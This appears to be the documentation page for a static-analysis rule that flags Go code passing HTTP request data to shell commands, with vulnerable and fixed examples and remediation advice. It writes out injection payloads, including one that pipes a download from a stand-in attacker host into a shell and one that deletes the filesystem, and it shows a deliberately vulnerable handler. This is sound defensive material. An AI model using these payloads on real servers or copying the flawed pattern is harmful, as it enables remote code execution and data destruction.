# OS command built from HTTP request data (Go)

`qualor:go/command-injection` · Issue · Severity: High · [CWE-78](https://cwe.mitre.org/data/definitions/78.html) · OWASP Top 10: [A05:2025 Injection](https://top10.owasp.org/2025/A05_2025-Injection/), [A03:2021 Injection](https://top10.owasp.org/2021/A03_2021-Injection/)

## What it finds

<!-- begin: what-it-finds -->
Data from the HTTP request that reaches an operating-system command started with `os/exec`:

- as part of a script that a shell runs (`exec.Command("sh", "-c", script)`, `cmd /C`,
  `pwsh -Command`), or
- as the program to run (`exec.Command(r.FormValue("tool"))`).

Request data means query and form values, path parameters, headers, cookies and JSON bodies, read
through `net/http` or through Gin, Echo, chi or gorilla/mux.
<!-- end: what-it-finds -->

## Why it matters

<!-- begin: why-it-matters -->
A shell reads its script as code. A value such as `x; rm -rf /` or `$(curl evil.example | sh)`
then starts commands of the client's choosing, with the rights of the server process. Choosing the
program from the request has the same effect without any shell syntax.
<!-- end: why-it-matters -->

## Example

<!-- begin: example -->
**Noncompliant:** the file name becomes part of a shell script.

```go
package backup

import (
	"net/http"
	"os/exec"
)

func Archive(w http.ResponseWriter, r *http.Request) {
	name := r.URL.Query().Get("name")
	exec.Command("sh", "-c", "tar czf /var/backups/out.tgz "+name).Run()
	w.WriteHeader(http.StatusNoContent)
}
```

**Compliant:** a fixed program, with the file name as a separate argument and no shell.

```go
package backup

import (
	"net/http"
	"os/exec"
)

func Archive(w http.ResponseWriter, r *http.Request) {
	name := r.URL.Query().Get("name")
	exec.Command("tar", "czf", "/var/backups/out.tgz", "--", name).Run()
	w.WriteHeader(http.StatusNoContent)
}
```
<!-- end: example -->

## How to fix

<!-- begin: how-to-fix -->
- Run a fixed program and pass request data as separate arguments:
  `exec.Command("convert", name, "out.png")`. `exec.Command` starts the program directly, so no
  shell parses the arguments.
- Do not hand request data to `sh -c`, `cmd /C` or `pwsh -Command`.
- If the program must vary, map the request value to a constant with a `switch` or a map lookup
  (an allow-list), never pass it through.
- Put `--` before values that could start with a dash, so the program does not read them as
  options.
<!-- end: how-to-fix -->

## Frameworks and APIs covered

- `net/http`
- `encoding/json`
- `os/exec`
- Gin
- Echo
- chi
- gorilla/mux

## Known limits

<!-- begin: known-limits -->
- An allow-list written as an `if` check that returns early is not recognised: the checked value
  is still reported. A `switch` or map lookup that yields constants is recognised.
- `os.StartProcess` and `syscall.Exec` are not checked yet.
- Arguments passed as a slice (`exec.Command("sh", args...)`) and the arguments of a Windows batch
  file are not followed.
<!-- end: known-limits -->

## Tests

The test file [`rules/go/command/command-injection.go`](../../../rules/go/command/command-injection.go) holds every case the rule reports or accepts:
lines marked `ruleid:` must be reported and lines marked `ok:` must not. The known limits are
marked `todoruleid:` (missed) and `todook:` (wrongly reported). `npm test` runs them with OpenGrep,
and checks the example above as well.
